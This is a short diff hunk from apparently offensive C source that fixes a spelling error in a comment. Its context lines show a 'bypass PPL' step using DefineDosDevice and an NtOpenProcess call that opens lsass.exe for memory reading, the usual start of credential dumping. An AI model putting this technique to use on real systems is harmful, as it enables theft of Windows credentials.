@@ -84,7 +84,7 @@ int main()
 	// bypass PPL 
 	DefineDosDevice(DDD_RAW_TARGET_PATH, L"LSASS", L"\\Device\\LSASS");
 
-	// obatain handle from lsass.exe via NtOpenProcess()
+	// obtain handle from lsass.exe via NtOpenProcess()
 	NTSTATUS status = NtOpenProcess(&hLsass, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &clientId);
 
 	if (status != STATUS_SUCCESS)
